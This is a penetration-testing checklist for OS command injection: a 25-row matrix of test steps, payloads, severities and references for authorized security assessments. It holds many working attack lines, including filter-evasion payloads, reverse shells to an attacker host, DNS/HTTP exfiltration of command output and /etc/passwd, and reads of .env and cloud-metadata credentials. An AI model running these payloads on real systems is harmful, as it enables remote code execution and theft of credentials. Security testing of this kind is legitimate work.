# Command Injection — Checklist

Expert per-attack **test-case matrix** for Command Injection — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*25 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| CMDI-001 | Map every feature that shells out | Recon &amp; Attack Surface | ping/lookup/whois/traceroute, convert/resize/transcode, tar/zip/backup, git clone, diagnostics, import/export/report | 1. Enumerate every input that could reach a shell: network tools (ping/nslookup/whois/traceroute), media (convert/resize/ffmpeg), archiving (tar/zip/backup), VCS (git clone), and admin diagnostics/import/export.<br>2. Grep source/JS for sinks: exec/system/spawn/shell_exec/popen/Runtime.exec/ProcessBuilder/subprocess(shell=True).<br>3. Note appliance 'diagnostic'/'ping' endpoints (recurring unauth cmdi). | A ranked list of candidate command sinks and the exact parameter that feeds each. | <code>features: /api/ping?host= , /convert?file= , /backup?name= , /git/clone?repo= , /admin/diagnostics</code> | Missing a shell-out feature means missing the app's most likely RCE. | Info | 0.0 (N/A) | Burp Suite Pro, source grep, ffuf | CWE-78; OWASP Testing Guide: Command Injection (WSTG-INPV-12) |
| CMDI-002 | Second-order &amp; metadata-driven sinks | Recon &amp; Attack Surface | Stored hostname/path/name in profile/config; filenames/headers/EXIF/metadata consumed by a backend job/cron | 1. Flag stored values (hostname, path, display name, filename) that a backend job/cron later feeds to a shell.<br>2. Test filenames, HTTP headers, and EXIF/metadata that a processor (ImageMagick/ExifTool/ffmpeg) shells out on.<br>3. Plant a blind OOB payload in the stored field and WATCH the callback (fires later, out-of-request). | A stored/metadata value triggers a delayed OOB callback when a backend consumes it. | <code>profile hostname = x;nslookup $COLLAB ; filename = &#96;id&#96;.jpg ; EXIF Comment = $(curl http://$COLLAB)</code> | Second-order cmdi (e.g. GitLab ExifTool CVE-2021-22205) is easily missed and often unauth RCE. | Info | 0.0 (N/A) | Burp Collaborator, exiftool | CWE-78; GitLab ExifTool CVE-2021-22205; HackTricks: Command Injection |
| CMDI-003 | Stand up an OOB host for blind detection | Recon &amp; Attack Surface | Any candidate sink where output is not reflected | 1. Register an interactsh / Burp Collaborator domain for DNS+HTTP callbacks.<br>2. Use DNS first (escapes most egress filters).<br>3. Keep the correlation id per-payload so each hit ties to one injection point + the target server IP. | A working OOB listener ready to catch blind execution and exfil. | <code>interactsh-client ; Burp Collaborator ; $COLLAB = &lt;id&gt;.oast.pro</code> | Blind cmdi is only provable via OOB or timing; without a listener you cannot confirm. | Info | 0.0 (N/A) | interactsh-client, Burp Collaborator | CWE-78; PortSwigger Web Security Academy: OS command injection |
| CMDI-004 | Inject benign markers &amp; classify channel + OS | Baseline / Classify | One chosen sink at a time | 1. Inject a deterministic benign marker and classify the channel: in-band (output), time (delay), or OOB (callback).<br>2. Identify OS/shell: Linux payloads silent does NOT mean safe - try Windows (&amp; ver, &amp; echo %OS%).<br>3. Record what LANDS: full-command vs argument-only vs quoted. | The sink is classified as in-band / time / OOB and the OS/shell is known. | <code>echo CMDI-7f3a9 ; &#96;expr 7 \&#42; 7&#96; ; &amp;ver ; &amp;echo %OS% ; ;uname</code> | Wrong OS/channel assumption is why real cmdi gets missed (Linux payloads look 'safe' on Windows). | Info | 0.0 (N/A) | Burp Repeater, commix | CWE-78; PortSwigger Web Security Academy: OS command injection |
| CMDI-005 | Context breakout — detect the quote/context | Baseline / Classify | Sinks where input lands inside quotes or parens | 1. Send 127.0.0.1' and 127.0.0.1" SEPARATELY - whichever errors reveals the quote you sit in.<br>2. Pick the matching breakout: unquoted ;id , double ";id;" , single ';id;' , inside &#96;&#96; / $() , or newline %0a.<br>3. Newline (%0a) ignores quoting; if all fail, pivot to argument injection. | The exact quoting context is identified and a matching breakout is selected. | <code>127.0.0.1'  vs  127.0.0.1"   -&gt;   "; id; "   &#124;   '; id; '   &#124;   %0a id</code> | Choosing the right breakout converts a 'filtered' sink into confirmed execution. | Info | 0.0 (N/A) | Burp Repeater | CWE-78; PayloadsAllTheThings/Command Injection (+ Argument Injection) |
| CMDI-006 | In-band injection (Linux separators) | Detect — In-band | Linux/Unix sinks, output reflected | 1. Try each separator with id/marker: ;id  &#124;id  &#124;&#124;id  &amp;id  &amp;&amp;id  &#96;id&#96;  $(id)  newline %0a id.<br>2. Look for id/uid=... or the marker in the response.<br>3. If input is one argument, prefix a benign value: 127.0.0.1;id. | id/whoami output (uid=...) or the marker appears in the response. | <code>;id   &#124;id   &#96;id&#96;   $(id)   127.0.0.1;id   %0aid</code> | In-band command execution = confirmed RCE = Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater, commix | CWE-78; PortSwigger Web Security Academy: OS command injection |
| CMDI-007 | Windows in-band injection | Detect — In-band | Windows/cmd.exe sinks (Linux payloads silent != safe) | 1. Try &amp; &#124; &#124;&#124; &amp;&amp; with whoami/ver/echo %OS%.<br>2. &#124;&#124; is a strong blind test on a bad host (runs on failure).<br>3. Confirm Windows first: &amp; ver , &amp; echo %OS%. | whoami/ver/OS output appears, confirming Windows command execution. | <code>127.0.0.1 &amp; whoami   127.0.0.1 &#124; whoami   127.0.0.1 &#124;&#124; ver   &amp; echo %OS%</code> | Windows RCE = Critical; commonly missed because Linux payloads produce no output. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater | CWE-78; HackTricks: Command Injection |
| CMDI-008 | Time-based blind injection | Detect — Blind (time) | Sinks with no reflected output | 1. Inject a delay: ;sleep 10 (Win &amp; ping -n 10 127.0.0.1 / &amp; timeout /t 10).<br>2. Confirm a REPEATED delay vs a no-payload baseline (2-3x) to exclude jitter.<br>3. Try each separator form: &#96;sleep 10&#96;, $(sleep 10), &#124;&#124; sleep 10. | The response is reliably delayed by ~10s only when the payload is present. | <code>;sleep 10   &#96;sleep 10&#96;   $(sleep 10)   &amp; ping -n 10 127.0.0.1   &amp; timeout /t 10</code> | Reliable blind delay = blind RCE = Critical (then add OOB/exfil). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater, commix --technique=T | CWE-78; PortSwigger Web Security Academy: OS command injection |
| CMDI-009 | Out-of-band (OOB) detection | Detect — Blind (OOB) | Blind sinks with egress; DNS preferred | 1. Trigger a callback: ;nslookup CMDI.$COLLAB / ;curl http://$COLLAB/CMDI (Win &amp; nslookup CMDI.$COLLAB).<br>2. Confirm the hit comes FROM THE TARGET server IP and carries your unique id.<br>3. DNS works even when HTTP egress is blocked. | A DNS/HTTP callback arrives at your listener from the target server, carrying your marker. | <code>;nslookup CMDI.$COLLAB   ;curl http://$COLLAB/CMDI   &amp; nslookup CMDI.$COLLAB</code> | Server-sourced OOB carrying your marker = blind RCE = Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | interactsh-client, Burp Collaborator | CWE-78; PortSwigger Web Security Academy: OS command injection |
| CMDI-010 | Boolean / response-difference blind (no time, no OOB) | Detect — Blind (boolean) | Blind sinks where timing is noisy AND OOB egress is blocked | 1. Find a success-vs-fail response diff: ;true vs ;false ; &#96;id&#96; vs &#96;idXXXX&#96;.<br>2. Use a marker branch: ;[ -f /etc/passwd ] &amp;&amp; echo CMDI_OK.<br>3. Read data 1 char/req via oracle: ;[ "$(whoami&#124;cut -c1)" = r ] &amp;&amp; &lt;observable&gt;. | A stable success-vs-failure signal proves execution and enables char-by-char exfil. | <code>;true vs ;false   ;[ $(id -u) -eq 0 ] &amp;&amp; &lt;true-branch&gt;   ;[ "$(whoami&#124;cut -c1)"=r ] &amp;&amp; &lt;obs&gt;</code> | Boolean oracle proves blind RCE and exfiltrates data with no timing/OOB channel. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Repeater/Intruder | CWE-78; HackTricks: Command Injection |
| CMDI-011 | Space-filter bypass | Evade — WAF/Filter | Sinks that block or strip spaces | 1. Linux: ${IFS} , $IFS$9 , {cmd,arg} brace expansion, &lt; redirection, tab via X=$'\t'.<br>2. Windows: %09 (tab), commas.<br>3. Combine with keyword tricks. | The command executes despite space filtering. | <code>cat${IFS}/etc/passwd   {cat,/etc/passwd}   cat&lt;/etc/passwd   cat$IFS$9/etc/passwd</code> | Restores execution when naive space blacklists are in place. | High | 8.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L) | Burp, poc/evasion.py | CWE-78; PayloadsAllTheThings/Command Injection (+ Argument Injection) |
| CMDI-012 | Keyword / command-name filter bypass | Evade — WAF/Filter | Sinks that blacklist command names (cat, whoami, etc.) | 1. Quote/escape splitting: c''at , c\at , "c"at , w'h'o'a'm'i , w\ho\am\i.<br>2. Globbing: /???/c?t /etc/passwd , /bin/c?t.<br>3. Var/case tricks: ${IFS%??} , $(tr A-Z a-z&lt;&lt;&lt;WHOAMI). | The blacklisted command runs after obfuscation. | <code>c''at /etc/passwd   w\ho\am\i   /???/c?t /etc/passwd   who$@ami</code> | Defeats command-name blacklists - a very common partial fix. | High | 8.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L) | Burp, poc/evasion.py | CWE-78; PayloadsAllTheThings/Command Injection (+ Argument Injection) |
| CMDI-013 | Encoded / base64-decode-pipe bypass | Evade — WAF/Filter | Heavily filtered sinks | 1. Linux: echo &lt;b64&gt;&#124;base64 -d&#124;bash ; printf '\167..'&#124;sh ; bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;..).<br>2. Windows: powershell -enc &lt;base64-UTF16LE&gt; (bypasses quote/space filters).<br>3. Encode the whole command to sidestep token blacklists. | The decoded command executes, bypassing the content filter. | <code>echo d2hvYW1p&#124;base64 -d&#124;bash   powershell -enc &lt;UTF16LE-b64&gt;</code> | Encoding hides the entire payload from signature-based WAFs. | High | 8.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L) | Burp, CyberChef | CWE-78; HackTricks: Command Injection |
| CMDI-014 | Windows evasion — env-substring / DOSfuscation | Evade — WAF/Filter | Windows sinks with keyword/space filters | 1. Rebuild a blocked word from env substrings: %COMSPEC:~-7,3% ; set s=who&amp;&amp;set t=ami&amp;&amp;cmd /v:on /c echo !s!!t!.<br>2. Escape/split: w^h^o^a^m^i , who""ami , "wh"o"am"i.<br>3. FOR /F: for /f %i in ('whoami') do @echo %i. | The blocked Windows command runs after DOSfuscation. | <code>w^h^o^a^m^i   who""ami   %COMSPEC:~-7,3%   for /f %i in ('whoami') do @echo %i</code> | Defeats Windows keyword filters that Linux-focused rules miss. | High | 8.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L) | Burp | CWE-78; HackTricks: Command Injection |
| CMDI-015 | Separator swap when one is filtered | Evade — WAF/Filter | Sinks blocking a specific separator | 1. If ; blocked, swap: &#124; , &#124;&#124; , &amp;&amp; , %0a (newline), &#96;cmd&#96; , $(cmd) , $IFS.<br>2. Newline (%0a / \n) frequently survives when metachars are stripped.<br>3. Re-test each after any partial fix. | Execution succeeds via an unfiltered separator. | <code>%0aid   &#124;id   $(id)   &#96;id&#96;   &#124;&#124;id</code> | A single-separator blacklist is trivially bypassed; proves the fix is incomplete. | High | 8.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L) | Burp | CWE-78; PayloadsAllTheThings/Command Injection (+ Argument Injection) |
| CMDI-016 | Argument / option injection (value is one argv item) | Argument Injection | Sinks where input becomes ONE argument to a known tool (no separators needed) | 1. Identify the tool (curl/tar/git/wget/zip/rsync/ssh) and inject its dangerous flags.<br>2. curl -o /var/www/html/sh.php http://$ATTACKER/sh.php (write-&gt;RCE) ; --upload-file /etc/passwd (exfil).<br>3. tar --checkpoint-action=exec=sh\ shell.sh ; git clone ext::sh -c id ; ssh -o ProxyCommand='sh -c id'. | A tool flag causes file write, command exec, or exfil even though separators are filtered. | <code>curl -o /var/www/html/sh.php http://$ATTACKER/sh.php<br>tar --checkpoint=1 --checkpoint-action=exec=sh\ -c\ id<br>git clone ext::sh -c 'id' x</code> | Argument injection -&gt; file write/RCE = Critical; -&gt; SSRF/read only = High. Bypasses separator filters entirely. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp, git/tar/curl | CWE-88; CWE-78; PayloadsAllTheThings/Command Injection (+ Argument Injection) |
| CMDI-017 | Interactive shell / reverse shell (authorized) | Impact — Shell | Confirmed exec; authorized red-team engagements only | 1. Bug bounty: a benign marker (id/whoami/hostname) is sufficient proof - STOP there.<br>2. Authorized red-team only: reverse shell to your listener.<br>3. Linux: bash -i &gt;&amp; /dev/tcp/$ATTACKER/4444 0&gt;&amp;1 ; Windows: PowerShell TCP client. Catch with nc -lvnp 4444. | A shell connects back (authorized) or id/whoami confirms interactive execution. | <code>bash -i &gt;&amp; /dev/tcp/$ATTACKER/4444 0&gt;&amp;1<br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f&#124;sh -i 2&gt;&amp;1&#124;nc $ATTACKER 4444 &gt;/tmp/f</code> | Full interactive control of the server - Critical RCE. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | netcat, poc/revshell.py | CWE-78; PortSwigger Web Security Academy: OS command injection |
| CMDI-018 | Blind exfil of command output via OOB | Impact — Exfil | Confirmed blind exec with an OOB channel | 1. Wrap output in the callback: ;nslookup $(whoami).$COLLAB ; ;curl http://$COLLAB/$(id&#124;base64).<br>2. Chunk for DNS label limits: for c in $(cat /etc/passwd&#124;base64&#124;tr -d '='&#124;fold -w60); do nslookup $c.$COLLAB; done.<br>3. Windows: &amp; nslookup %COMPUTERNAME%.$COLLAB. | Command output (whoami/hostname/file contents) arrives at your OOB listener. | <code>;nslookup $(whoami).$COLLAB   ;curl http://$COLLAB/$(id&#124;base64)   &amp; nslookup %COMPUTERNAME%.$COLLAB</code> | Proves data exfiltration from a blind sink - demonstrates concrete impact to the client. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | interactsh-client, Burp Collaborator | CWE-78; PortSwigger Web Security Academy: OS command injection |
| CMDI-019 | Post-exploitation read: config/.env/cloud creds | Impact — Pivot | Confirmed exec (authorized); read-only | 1. Read app secrets: cat .env / config -&gt; DB creds, API keys (read-only).<br>2. Cloud metadata from the box: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ -&gt; IAM creds.<br>3. Validate creds prove access, then STOP - no lateral movement without scope. | Config secrets or cloud IAM credentials are read from the compromised host. | <code>cat /var/www/.env ; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> | Turns RCE into cloud-account/database compromise - maximum client impact. | Critical | 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) | curl, SSRFmap | CWE-78; CWE-918; HackTricks: Command Injection |
| CMDI-020 | GTFOBins privilege escalation from limited exec | Impact — Privesc | Confirmed exec as a low-priv user (authorized) | 1. If exec is via a 'limited' binary, escape to a full shell: awk 'BEGIN{system("/bin/sh")}' , find . -exec /bin/sh \; , vi -c ':!sh'.<br>2. Enumerate privesc: sudo -l ; getcap -r / ; find / -perm -4000.<br>3. Match the binary on gtfobins.github.io. | A limited binary yields a full shell or a SUID/sudo path to root. | <code>awk 'BEGIN{system("/bin/sh")}'   find . -exec /bin/sh \;   sudo -l   find / -perm -4000</code> | Escalates limited exec to full/root control - deepens impact. | High | 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) | GTFOBins, LinPEAS | CWE-78; GTFOBins (gtfobins.github.io) |
| CMDI-021 | Special sink — ImageMagick delegate (ImageTragick) | Impact — Special Sinks | Image-processing features (upload/convert/resize) using ImageMagick | 1. Upload a crafted MVG/SVG whose delegate shells out: push graphic-context; image over 0,0 0,0 'https://x"&#124;id "&gt;'; pop graphic-context.<br>2. Cross-ref the FileUpload kit to land the file.<br>3. Confirm via OOB/output. | Processing the crafted image executes your command (ImageTragick). | <code>MVG: image over 0,0 0,0 'https://x"&#124;curl http://$COLLAB "&gt;'</code> | Unauth RCE via image upload (CVE-2016-3714) - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | ImageMagick, Burp | CWE-78; ImageTragick CVE-2016-3714; HackTricks: Command Injection |
| CMDI-022 | Special sink — ffmpeg / Ghostscript / git hook | Impact — Special Sinks | Media transcoding (ffmpeg), PDF/EPS rendering (Ghostscript), git clone/checkout | 1. ffmpeg: crafted .m3u8 referencing file:///etc/passwd or http://169.254.169.254 (read/SSRF).<br>2. Ghostscript -dSAFER bypass via crafted .eps/.pdf (%pipe%id) -&gt; RCE (CVE-2018-16509 / CVE-2023-36664).<br>3. git: clone ext::sh -c 'id' or a repo with a malicious post-checkout hook. | The processor executes your command or reads local files/SSRF. | <code>m3u8 -&gt; file:///etc/passwd ; EPS -&gt; (%pipe%id) ; git clone ext::sh -c 'id'</code> | RCE/file-read via trusted media/VCS processors - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | ffmpeg, Ghostscript, git | CWE-78; Ghostscript CVE-2023-36664; HackTricks: Command Injection |
| CMDI-023 | Shellshock (env-var -&gt; bash function trailer RCE) | Impact — Known CVE | Legacy CGI reachable via headers (User-Agent/Cookie/Referer) | 1. Target CGI that exports request data into bash env.<br>2. Inject: () { :;}; echo; /bin/id in User-Agent/Cookie.<br>3. Confirm output/OOB. Still found on legacy appliances. | The bash function-trailer executes your command via a CGI env var. | <code>User-Agent: () { :;}; echo; /usr/bin/id</code> | Unauth RCE on legacy CGI (CVE-2014-6271) - Critical. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp, nmap http-shellshock | CWE-78; Shellshock CVE-2014-6271; HackTricks: Command Injection |
| CMDI-024 | False-positive filter / auto-reject | Validation &amp; Reporting | Before reporting any candidate | 1. REJECT: a ;/&#124; merely reflected (no command ran); a single slow response after ;sleep (jitter - re-test); an 'invalid host' error (validation); an OOB hit you cannot tie to your payload+target IP; SSRF mislabeled as cmdi; 'commix flagged it' with no manual repro; self-DoS.<br>2. REQUIRE: execution proof = output / repeated delay / server-sourced OOB carrying your marker.<br>3. Re-test timing 2-3x; use a benign marker. | Only candidates with genuine execution proof survive. | <code>reflected ; = NOT a finding ; single slow response = re-test ; commix-only = reproduce first</code> | Protects report credibility; cmdi is dense with reflection/jitter false positives. | Info | 0.0 (N/A) | manual, Burp | CWE-78; PortSwigger Web Security Academy: OS command injection |
| CMDI-025 | Client-facing impact &amp; PoC package | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Lead with impact: RCE = Critical (in-band/blind/OOB all equal).<br>2. Provide the exact request, the benign marker output (id/whoami) or the correlated OOB hit + timing runs, and the affected parameter/OS.<br>3. Set CVSS 3.1 + CWE-78 (CWE-88 for argument injection). Remediation: avoid shelling out - use library/native APIs; if unavoidable, no shell interpolation, use execFile/argv arrays with a strict allowlist, and never pass user input as arguments.<br>4. Benign marker only, removed any written files, killed shells, no persistence; de-dupe to one finding per sink. | A reproducible, correctly-rated, safe PoC with clear remediation. | <code>PoC: request + id/whoami output (or OOB hit + 2-3 timing runs) + CVSS + CWE-78/88 + remediation.</code> | Converts execution proof into a defensible Critical report at the correct severity. | Info | 0.0 (N/A) | CVSS calculator, COMMAND_INJECTION_REPORT_TEMPLATE.md | CWE-78; CWE-88; FIRST CVSS v3.1; OWASP Testing Guide: Command Injection (WSTG-INPV-12)  &#124;  TOP REFERENCES: PortSwigger Academy; PayloadsAllTheThings; HackTricks; GTFOBins; OWASP; Hacker Recipes |
